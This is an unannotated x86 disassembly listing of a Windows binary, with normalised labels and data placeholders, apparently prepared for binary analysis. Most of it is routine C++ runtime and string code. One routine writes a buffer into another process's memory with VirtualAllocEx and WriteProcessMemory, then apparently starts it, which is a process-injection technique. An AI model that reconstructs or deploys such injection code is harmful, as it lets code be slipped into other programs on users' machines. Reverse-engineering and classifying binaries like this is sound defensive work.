mov [ ebp - 0x18 ] eax
cmp edi esi
je r-xdata
sub_1000fe71
push ebp
mov ebp esp
mov eax [ ebp + 0x24 ]
sub eax [ ebp + 0x1c ]
sub esp 0x14
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx eax
lea eax [ ebp + 0x28 ]
call sub_1000f726
mov eax [ ebp + 0x28 ]
test eax eax
je r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x8 ]
call sub_1000f434
mov edi eax
lea eax [ ebp - 0x10 ]
call sub_1000f434
push 0xffffffff
push 0x0
push edi
mov ecx eax
call sub_10002033
inc [ ebp - 0xc ]
inc [ ebp - 0x4 ]
jmp r-xdata
mov eax [ eax ]
mov ecx [ ebp + 0x2c ]
mov esi [ ebp + 0x24 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] esi
je r-xdata
sub_1000ff11
push 0x78
mov eax sub_10049e08
call sub_10023e33
mov esi ecx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov eax [ esi + 0x14 ]
push 0x4
push 0x1000
lea edi [ eax + eax ]
push edi
push ebx
push [ ebp + 0x8 ]
call [ VirtualAllocEx@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
push r--data
lea ecx [ ebp - 0x5c ]
call sub_10001d1f
mov [ ebp - 0x4 ] ebx
and [ ebp - 0x10 ] 0x0
cmp [ esi + 0x18 ] 0x8
jb r-xdata
push r--data
lea ecx [ ebp - 0x5c ]
call sub_10001d1f
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
lea eax [ ebp - 0x5c ]
push eax
lea ecx [ ebp - 0x84 ]
call sub_10001d6b
push r--data
lea eax [ ebp - 0x84 ]
push eax
call sub_10023a01
cmp [ ebp - 0x10 ] edi
je r-xdata
push r--data
lea ecx [ ebp - 0x5c ]
call sub_10001d1f
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
push edi
push esi
push ebx
push [ ebp + 0x8 ]
call [ WriteProcessMemory@IAT ]
cmp eax 0x1
je r-xdata
lea esi [ ebp - 0x18 ]
call sub_10011e12
push r--data
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x4
call sub_10001d1f
lea eax [ ebp - 0x40 ]
push eax
mov eax esi
push eax
mov [ ebp - 0x4 ] 0x5
call sub_10011fbc
push 0x0
push 0x1
lea ecx [ ebp - 0x40 ]
mov esi eax
mov [ ebp - 0x4 ] 0x4
call sub_100023ce
push ebx
push esi
push [ ebp + 0x8 ]
lea edi [ ebp - 0x24 ]
call sub_10013c8f
push 0xa
mov [ ebp - 0x4 ] 0x6
call [ Sleep@IAT ]
mov eax edi
push eax
call sub_100115d1
mov ecx edi
mov [ ebp - 0x24 ] r--data
call sub_100132ab
call sub_10023f0b
retn 0x4
push r--data
lea ecx [ ebp - 0x5c ]
call sub_10001d1f
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
sub_1001006a
push 0x30
mov eax sub_1004a6f4
call sub_10023e33
mov [ ebp - 0x18 ] r--data
call sub_10011ebd
mov [ ebp - 0x14 ] eax
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x3c ]
lea eax [ ebp - 0x18 ]
call sub_100120c4
mov esi eax
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0x1
call sub_10013d0f
pop ecx
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x20 ]
push [ eax + 0x4 ]
mov ecx esi
call sub_1000ff11
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x1c ]
test ecx ecx
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x3c ]
call sub_10002597
call sub_10023f0b
retn 0x4
call sub_1000ad5c
sub_100100e1
push 0x0
mov eax sub_1004aaca
call sub_10023e33
mov edi [ ebp + 0x8 ]
mov eax edi
call sub_1000ada3
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
lea esi [ edi + 0x18 ]
mov [ edi ] r--data
call sub_100102ff
pop ecx
push [ ebp + 0x10 ]
lea ecx [ edi + 0x34 ]
mov [ ebp - 0x4 ] 0x1
call sub_100020c6
mov [ edi + 0x50 ] 0x0
and [ edi + 0x54 ] 0x0
and [ edi + 0x58 ] 0x0
mov eax edi
call sub_10023f0b
retn 0xc
sub_1001014e
push 0x4
mov eax sub_10049db5
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x3
call sub_1001040d
mov [ ebp - 0x4 ] 0x2
mov ecx [ esi + 0x58 ]
test ecx ecx
je r-xdata
push 0x0
push 0x1
lea ecx [ esi + 0x34 ]
call sub_10002597
push 0x0
push 0x1
lea ecx [ esi + 0x18 ]
call sub_10002597
mov ecx esi
mov [ esi ] r--data
call sub_100132ab
call sub_10023f0b
retn
call sub_1000ad5c
sub_100101ac
push 0x48
mov eax sub_10049d71
call sub_10023e33
mov ebx ecx
push 0x8
call sub_10020186
pop ecx
mov [ ebp - 0x10 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor esi esi
lea ecx [ ebx + 0x18 ]
push ecx
mov esi eax
call sub_10013e07
mov esi eax
jmp r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ ebp - 0x10 ]
mov [ esi + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
or [ ebp - 0x4 ] 0xffffffff
push esi
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x1c ] esi
call sub_1001044f
push esi
lea eax [ ebp - 0x1c ]
push esi
push eax
call sub_100289c4
add esp 0xc
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x10 ]
lea esi [ ebx + 0x54 ]
call sub_1000ad88
lea eax [ ebp - 0x14 ]
cmp eax esi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x18 ]
test ecx ecx
je r-xdata
call sub_1000ad5c
push r--data
lea ecx [ ebp - 0x38 ]
call sub_10001d1f
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x4 ] 0x2
mov eax [ esi ]
push ecx
push eax
call sub_10011f4d
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ ebp - 0x38 ]
mov edi eax
call sub_100023ce
test edi edi
jne r-xdata
call sub_1000ad5c
mov [ ebx + 0x50 ] 0x1
call edi
lea eax [ ebp - 0x1c ]
cmp eax esi
je r-xdata
push r--data
lea ecx [ ebp - 0x54 ]
call sub_10001d1f
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x3
mov eax [ esi ]
push ecx
push eax
call sub_10011f4d
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ ebp - 0x54 ]
mov edi eax
call sub_100023ce
test edi edi
je r-xdata
mov ecx [ esi + 0x4 ]
and [ esi + 0x4 ] 0x0
test ecx ecx
je r-xdata
and [ esi ] 0x0
lea edi [ ebx + 0x34 ]
mov esi r--data
push esi
mov ecx edi
call sub_1000ccf6
test eax eax
je r-xdata
xor eax eax
call sub_10023f0b
retn
call sub_1000ad5c
jmp r-xdata
push esi
mov ecx edi
call sub_10001444
push edi
call sub_100125ec
pop ecx
sub_100102ff
push 0x118
mov eax sub_1004aa8f
call sub_10023e9c
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x34 ] eax
cmp [ eax + 0x14 ] edi
ja r-xdata
push r--data
lea ecx [ ebp - 0x74 ]
call sub_100012f3
lea eax [ ebp - 0x30 ]
push eax
lea ebx [ ebp - 0x74 ]
mov [ ebp - 0x4 ] 0x2
call sub_10012344
pop ecx
push edi
xor edi edi
inc edi
push edi
mov ecx ebx
mov [ ebp - 0x4 ] 0x4
call sub_10002597
lea ecx [ ebp - 0x30 ]
lea ebx [ ebp - 0x58 ]
call sub_1001250f
push r--data
push eax
push esi
mov [ ebp - 0x4 ] 0x5
call sub_10009652
add esp 0xc
push 0x0
push edi
mov ecx ebx
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x4 ] 0x4
call sub_10002597
cmp [ esi + 0x18 ] 0x8
jb r-xdata
push r--data
lea ecx [ ebp - 0x58 ]
call sub_10001d1f
lea eax [ ebp - 0x58 ]
push eax
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x1
call sub_10001d6b
push r--data
lea eax [ ebp - 0x9c ]
push eax
call sub_10023a01
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
push eax
lea eax [ ebp - 0x124 ]
push eax
push 0x22
pop ecx
call sub_1000e727
push [ ebp - 0x34 ]
lea eax [ ebp - 0x124 ]
push eax
mov [ ebp - 0x4 ] 0x6
call sub_1000eaf2
pop ecx
pop ecx
lea eax [ ebp - 0x124 ]
mov [ ebp - 0x4 ] 0x4
call sub_1000de3a
push 0x0
push edi
lea ecx [ ebp - 0x30 ]
call sub_10002597
mov eax esi
call sub_10023f1f
retn
sub_1001040d
push 0x4
mov eax sub_10049d34
call sub_10023e66
mov esi ecx
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x18 ]
push eax
call sub_100125ec
pop ecx
add esi 0x34
push r--data
mov ecx esi
call sub_1000ccf6
test eax eax
je r-xdata
call sub_10023f0b
retn
push esi
call sub_100125ec
pop ecx
sub_1001044f
push 0x4
mov eax sub_100488ed
call sub_10023e66
mov esi ecx
and [ esi ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x10
call sub_10020186
pop ecx
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
call sub_10023f0b
retn 0x4
sub_1001052e
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004aa2a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x90
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x98 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x14 ]
test eax eax
jbe r-xdata
mov ecx [ esp + 0x98 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
cmp [ ecx + 0x1c ] 0x8
jb r-xdata
add ecx 0x8
mov ecx [ ecx + 0x8 ]
jmp r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
push ecx
lea eax [ esp + 0x10 ]
push eax
push 0x2
pop ecx
call sub_1000e727
and [ esp + 0xa0 ] 0x0
cmp [ esi + 0x18 ] 0x10
mov eax [ esi + 0x14 ]
jb r-xdata
push eax
push esi
lea eax [ esp + 0x14 ]
push eax
call sub_100106b4
or [ esp + 0xa0 ] 0xffffffff
lea eax [ esp + 0xc ]
call sub_1000de3a
sub_100105d0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004a9fe
mov eax [ fs : 0x0 ]
push eax
sub esp 0xb0
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc0 ]
mov [ fs : 0x0 ] eax
cmp [ ecx + 0x1c ] 0x8
jb r-xdata
add ecx 0x8
mov ecx [ ecx + 0x8 ]
jmp r-xdata
or [ esp + 0xc8 ] 0xffffffff
lea eax [ esp + 0x14 ]
call sub_1000de1e
mov ecx [ esp + 0xc0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea esi [ esp + 0x14 ]
call sub_1000ded5
lea esi [ esp + 0xa4 ]
lea eax [ esp + 0x14 ]
call sub_1000df44
mov esi [ eax + 0x8 ]
add esi [ eax ]
sub esp 0x18
mov eax esp
lea ebx [ esp + 0x2c ]
mov [ esp + 0x28 ] esp
mov [ eax ] edi
mov [ eax + 0x8 ] edi
mov [ eax + 0xc ] edi
mov [ eax + 0x10 ] edi
call sub_1000de56
push edi
mov edi [ ebp + 0x8 ]
push esi
mov ecx edi
call sub_1000c375
cmp [ edi + 0x18 ] 0x10
jb r-xdata
push ecx
lea eax [ esp + 0x18 ]
push eax
call sub_1000df79
xor edi edi
mov [ esp + 0xc8 ] edi
cmp [ esp + 0x68 ] edi
je r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
push esi
push edi
lea eax [ esp + 0x1c ]
push eax
call sub_1000c9b3
sub_100106b4
push 0x10
mov eax sub_1004a9d8
call sub_10023e66
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
xor ebx ebx
push eax
mov [ ebp - 0x14 ] ebx
call sub_1000ee8f
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x18 ] bl
jne r-xdata
push [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + edi + 0x28 ]
push [ ebp + 0xc ]
mov eax [ ecx ]
call [ eax + 0x20 ]
cmp eax [ ebp + 0x10 ]
je r-xdata
mov [ ebp - 0x14 ] 0x4
jmp sub_1001073b
mov [ ebp - 0x4 ] ebx
jmp sub_1001073b
mov [ ebp - 0x14 ] 0x4
sub_1001070b
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
xor ebx ebx
or ecx 0x4
cmp [ eax + 0x28 ] ebx
jne r-xdata
push 0x1
push eax
call sub_10007d13
mov [ ebp - 0x4 ] ebx
mov eax r-xdata
retn
or ecx 0x4
sub_1001073b
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x1c ]
push eax
call sub_10007c4c
mov eax edi
call sub_10023f0b
retn 0xc
push ebx
push [ ebp - 0x14 ]
call sub_10007e2d
sub_10010783
push ebx
push esi
mov esi ecx
xor ebx ebx
push ebx
push 0x1
lea ecx [ esi + 0x74 ]
mov [ esi ] r--data
call sub_10002597
push ebx
push 0x1
lea ecx [ esi + 0x58 ]
call sub_10002597
push ebx
push 0x1
lea ecx [ esi + 0x3c ]
call sub_10002597
push ebx
push 0x1
lea ecx [ esi + 0x20 ]
call sub_10002597
push ebx
push 0x1
lea ecx [ esi + 0x4 ]
call sub_100023ce
mov [ esi ] r--data
pop esi
pop ebx
retn
sub_100107cf
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004b0e2
mov eax [ fs : 0x0 ]
push eax
sub esp 0x70
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x68 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x80 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ esp + 0x1c ] eax
mov eax [ ebp + 0xc ]
mov esi ecx
mov edi r--data
push edi
lea ecx [ esp + 0x28 ]
mov [ esp + 0x24 ] eax
call sub_100012f3
xor ebx ebx
push edi
lea ecx [ esp + 0x44 ]
mov [ esp + 0x8c ] ebx
call sub_100012f3
lea eax [ esp + 0x24 ]
push eax
lea ecx [ esi + 0x58 ]
lea edx [ esp + 0x44 ]
mov [ esp + 0x8c ] 0x1
call sub_10013f1b
pop ecx
lea ecx [ esp + 0x14 ]
push ecx
mov ecx eax
call sub_10014246
mov edi r--data
mov [ esp + 0x14 ] edi
push ebx
push 0x1
lea ecx [ esp + 0x48 ]
call sub_10002597
push ebx
push 0x1
lea ecx [ esp + 0x2c ]
call sub_10002597
push ebx
lea ecx [ esp + 0x60 ]
mov [ esp + 0x78 ] 0xf
call sub_10002493
lea eax [ esp + 0x5c ]
push eax
push [ esp + 0x20 ]
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esi + 0x74 ]
push esi
mov [ esp + 0x98 ] 0x5
call sub_10010902
push [ esp + 0x20 ]
lea eax [ esp + 0x60 ]
lea ecx [ esi + 0x4 ]
push eax
call sub_10010c13
pop ecx
pop ecx
push ebx
push 0x1
lea ecx [ esp + 0x64 ]
call sub_100023ce
lea ecx [ esp + 0x14 ]
mov [ esp + 0x14 ] edi
call sub_100142b1
mov ecx [ esp + 0x80 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x68 ]
xor ecx esp
call sub_10020040
mov esp ebp
pop ebp
retn 0x8
sub_10010902
push 0x1cc
mov eax sub_1004b09a
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x74 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x80 ] eax
lea eax [ ebp - 0x68 ]
mov esi ecx
push eax
mov eax esi
mov [ ebp - 0x68 ] 0x2f
call sub_10010e2e
mov [ ebp - 0x68 ] eax
cmp eax 0xffffffff
jne r-xdata
push eax
xor ebx ebx
push ebx
lea eax [ ebp - 0x64 ]
push eax
mov ecx esi
call sub_1000925c
xor edi edi
inc edi
mov [ ebp - 0x4 ] edi
mov eax [ esi + 0x14 ]
mov ecx [ ebp - 0x68 ]
sub eax ecx
dec eax
push eax
inc ecx
push ecx
lea eax [ ebp - 0x48 ]
push eax
mov ecx esi
call sub_1000925c
mov esi r--data
push esi
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x2
call sub_100012f3
push esi
lea ecx [ ebp - 0xd4 ]
mov [ ebp - 0x4 ] 0x3
call sub_100012f3
lea eax [ ebp - 0x9c ]
push eax
mov [ ebp - 0x4 ] 0x4
push [ ebp - 0x78 ]
lea edx [ ebp - 0xd4 ]
lea ecx [ ebp - 0x64 ]
call sub_10013fc6
pop ecx
pop ecx
lea ecx [ ebp - 0x7c ]
push ecx
mov ecx eax
call sub_10014246
mov [ ebp - 0x7c ] r--data
push ebx
push edi
lea ecx [ ebp - 0xd4 ]
call sub_10002597
push ebx
push edi
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x7
call sub_10002597
push esi
lea ecx [ ebp - 0xb8 ]
call sub_100012f3
push esi
lea ecx [ ebp - 0x10c ]
mov [ ebp - 0x4 ] 0x8
call sub_100012f3
push esi
lea ecx [ ebp - 0x128 ]
mov [ ebp - 0x4 ] 0x9
call sub_100012f3
push r--data
lea ecx [ ebp - 0xf0 ]
mov [ ebp - 0x4 ] 0xa
call sub_100012f3
mov [ ebp - 0x4 ] 0xb
mov esi [ ebp - 0x6c ]
lea eax [ esi + 0x20 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x144 ]
push eax
call sub_10009607
add esp 0xc
lea ecx [ ebp - 0xb8 ]
push ecx
lea ecx [ ebp - 0x10c ]
push ecx
lea ecx [ ebp - 0x128 ]
push ecx
lea ecx [ ebp - 0x7c ]
push ecx
mov ecx eax
lea edx [ ebp - 0xf0 ]
mov [ ebp - 0x4 ] 0xc
call sub_10014071
add esp 0x10
lea ecx [ ebp - 0x70 ]
push ecx
mov ecx eax
call sub_10014246
mov [ ebp - 0x70 ] r--data
push ebx
push edi
lea ecx [ ebp - 0x144 ]
call sub_10002597
push ebx
push edi
lea ecx [ ebp - 0xf0 ]
call sub_10002597
push ebx
push edi
lea ecx [ ebp - 0x128 ]
call sub_10002597
push ebx
push edi
lea ecx [ ebp - 0x10c ]
call sub_10002597
push ebx
push edi
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x12
call sub_10002597
mov ecx [ ebp - 0x74 ]
push r--data
mov [ ebp - 0x68 ] ebx
call sub_10006cf6
test eax eax
mov eax [ ebp - 0x74 ]
je r-xdata
push r--data
lea ecx [ ebp - 0xb8 ]
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0xb8 ]
push eax
lea ecx [ ebp - 0x150 ]
call sub_10001d6b
push r--data
lea eax [ ebp - 0x150 ]
push eax
call sub_10023a01
push [ eax + 0x14 ]
lea ecx [ esi + 0x3c ]
push [ ebp - 0x68 ]
lea edx [ ebp - 0x70 ]
call sub_10011240
pop ecx
pop ecx
lea eax [ ebp - 0x1d8 ]
push eax
call sub_10010d14
push 0x800
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x13
call sub_1000b1c4
mov [ ebp - 0x4 ] 0x14
jmp r-xdata
cmp [ eax + 0x18 ] 0x10
jb r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
push [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call sub_1001416e
cmp eax ebx
ja r-xdata
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x68 ] ecx
cmp [ ebp - 0x14 ] 0x10
mov ecx [ ebp - 0x28 ]
jae r-xdata
lea ecx [ ebp - 0x9c ]
lea eax [ ebp - 0x1d8 ]
call sub_10010d7c
mov ecx [ ebp - 0x80 ]
push 0xffffffff
push ebx
push eax
mov [ ebp - 0x4 ] 0x15
call sub_100021b2
push ebx
push edi
lea ecx [ ebp - 0x9c ]
call sub_100023ce
push ebx
push edi
lea ecx [ ebp - 0x2c ]
call sub_100023ce
lea eax [ ebp - 0x1d8 ]
mov [ ebp - 0x4 ] 0x12
call sub_1000c359
lea ecx [ ebp - 0x70 ]
mov [ ebp - 0x70 ] r--data
call sub_100142b1
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x7c ] r--data
call sub_100142b1
push ebx
push edi
lea ecx [ ebp - 0x48 ]
call sub_10002597
push ebx
push edi
lea ecx [ ebp - 0x64 ]
call sub_10002597
call sub_10023f1f
retn 0x10
push eax
push ecx
lea eax [ ebp - 0x1d0 ]
push eax
call sub_100106b4
lea ecx [ ebp - 0x28 ]
sub_10010c13
push 0x64
mov eax sub_100495d7
call sub_10023e33
mov esi ecx
mov ecx [ ebp + 0xc ]
push r--data
call sub_10002521
cmp [ esi + 0x18 ] 0x10
mov ecx [ esi + 0x14 ]
lea ebx [ esi + 0x4 ]
jb r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
push esi
call sub_10001daa
add edi [ eax + 0x14 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
cmp [ esi + 0x18 ] 0x10
mov eax [ esi + 0x14 ]
jb r-xdata
push r--data
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
push ecx
push eax
push [ ebp + 0x8 ]
xor eax eax
call sub_10010d92
mov edi eax
lea ecx [ ebp - 0x2c ]
cmp edi 0xffffffff
jne r-xdata
push eax
push ebx
push [ ebp + 0x8 ]
lea eax [ edi - 0x1 ]
call sub_10010d92
cmp eax 0xffffffff
jne r-xdata
mov ebx [ ebx ]
cmp edi eax
jbe r-xdata
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001d1f
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
sub eax edi
push eax
push edi
push [ ebp + 0x8 ]
lea esi [ ebp - 0x48 ]
call sub_1000c399
mov ecx [ ebp + 0xc ]
push 0xffffffff
push 0x0
push eax
mov [ ebp - 0x4 ] 0x3
call sub_100021b2
push 0x0
push 0x1
mov ecx esi
call sub_100023ce
call sub_10023f0b
retn
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001d1f
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x70 ]
call sub_10001d6b
push r--data
lea eax [ ebp - 0x70 ]
push eax
call sub_10023a01
sub_10010d14
push 0x8
mov eax sub_10049f5f
call sub_10023e33
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] r--data
mov [ esi + 0x54 ] r--data
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0xc ]
xor ebx ebx
push edi
inc ebx
push esi
mov [ ebp - 0x10 ] ebx
call sub_1000ca8e
mov [ ebp - 0x4 ] ebx
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push edi
mov [ esi + eax ] r--data
call sub_1000cb0a
and [ edi + 0x3c ] 0x0
and [ edi + 0x40 ] 0x0
mov [ edi ] r--data
mov eax esi
call sub_10023f0b
retn 0x4
sub_10010d92
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x10 ] 0x0
mov ecx [ ebp + 0x8 ]
jne r-xdata
push ebx
push esi
mov esi [ ecx + 0x14 ]
push edi
cmp eax esi
jae r-xdata
cmp eax [ ecx + 0x14 ]
jbe r-xdata
or eax 0xffffffff
sub esi eax
cmp [ ebp + 0x10 ] esi
ja r-xdata
leave
retn 0xc
xor edx edx
inc edx
sub edx [ ebp + 0x10 ]
add esi edx
cmp [ ecx + 0x18 ] 0x10
jb r-xdata
add ecx 0x4
mov [ ebp - 0x4 ] ecx
add ecx 0x4
mov [ ebp - 0x4 ] ecx
mov ecx [ ecx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
movsx eax [ eax ]
push esi
push eax
push ebx
call sub_100208d0
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
lea ebx [ ecx + eax ]
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_10020a5a
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
sub ebx edi
lea esi [ esi + ebx - 0x1 ]
lea ebx [ edi + 0x1 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov eax edi
sub eax ecx
jmp r-xdata
sub_10010e2e
push ebp
mov ebp esp
mov ecx [ eax + 0x14 ]
sub esp 0xc
push ebx
push esi
push edi
test ecx ecx
jbe r-xdata
or eax 0xffffffff
cmp ecx 0x1
jb r-xdata
mov [ ebp - 0x4 ] ecx
mov ecx [ eax + 0x18 ]
add eax 0x4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ecx 0x8
jb r-xdata
mov ebx eax
mov ebx [ eax ]
jmp r-xdata
push [ ebp - 0x4 ]
push edi
push ebx
call sub_10010f99
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edi [ eax ]
jmp r-xdata
push 0x1
push [ ebp + 0x8 ]
push esi
call sub_10006bd6
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x8
jb r-xdata
mov eax esi
sub eax ebx
sar eax 0x1
or ecx 0xffffffff
sub ecx eax
add [ ebp - 0x4 ] ecx
lea ebx [ esi + 0x2 ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov eax esi
sub eax ecx
sar eax 0x1
jmp r-xdata
sub_10010ebd
push 0x40
mov eax sub_10048d02
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x40 ]
xor edi edi
mov [ ebp - 0x4c ] edi
test dl 0x2
jne r-xdata
test dl 0x4
jne r-xdata
mov ecx [ eax + 0x24 ]
cmp [ ecx ] edi
je r-xdata
push edi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x30 ] 0xf
call sub_10002493
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
mov [ ebp - 0x4 ] 0x2
call sub_10001daa
lea ecx [ ebp - 0x48 ]
mov edx [ eax + 0x20 ]
cmp [ edx ] edi
je r-xdata
mov ecx [ ecx ]
mov edx [ eax + 0x3c ]
cmp edx ecx
jb r-xdata
mov ecx [ eax + 0x30 ]
mov ecx [ ecx ]
add ecx [ edx ]
mov eax [ eax + 0x10 ]
mov eax [ eax ]
sub ecx eax
push ecx
push eax
lea ecx [ ebp - 0x2c ]
call sub_10010f73
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax [ eax + 0x14 ]
mov eax [ eax ]
sub ecx eax
push ecx
push eax
lea ecx [ ebp - 0x2c ]
call sub_10010f73
mov [ ebp - 0x4 ] edi
mov ecx edx
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_10001daa
lea ecx [ ebp - 0x2c ]
jmp r-xdata
push edi
push 0x1
call sub_100023ce
mov eax ebx
call sub_10023f1f
retn 0x4
sub_10010fb9
push 0xac
mov eax sub_10049599
call sub_10023e33
mov esi ecx
xor ebx ebx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ebx
call sub_10001b23
lea ecx [ esi + 0x1c ]
call sub_10001b23
xor edi edi
mov [ ebp - 0x4 ] ebx
inc edi
push r--data
lea ecx [ ebp - 0x90 ]
mov [ ebp - 0x14 ] edi
call sub_100012f3
push r--data
